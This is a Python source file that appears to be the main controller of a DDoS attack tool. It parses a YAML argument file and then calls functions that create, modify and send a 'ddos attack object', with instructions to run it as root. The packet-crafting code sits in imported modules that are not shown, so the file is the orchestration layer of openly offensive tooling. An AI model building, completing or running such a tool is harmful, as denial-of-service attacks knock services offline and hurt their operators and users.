"""
The main controller will call all the necessary file
First the create.py
Second modify.py
The send.py
"""

"""
How to run
Run as root
Execute command in shell
python3 attack.py "argumentsfilename"
"""

import argparse
import sys

from dependencies import *

def retrieve_arguments():
    # Retrieve all the arguments from the yaml file
    ap = argparse.ArgumentParser()
    ap.add_argument("FILE", help="Enter name of the file")
    YAML_FILE = vars(ap.parse_args())["FILE"]
    f = open(YAML_FILE, "r")
    yaml_data = yaml.load(f, Loader=yaml.FullLoader)
    args = {}
    for dictionary in yaml_data:
        for key in dictionary.keys():
            args[key] = dictionary[key]
    return args

def perform_attack():
    script_args = retrieve_arguments()
    ddos_attack_object = create_ddos_attack_object(script_args)
    modified_ddos_attack_object = modify_ddos_attack_object(
        ddos_attack_object, script_args)
    send_ddos_attack_object(modified_ddos_attack_object,
     script_args)

if __name__ == "__main__":
    perform_attack()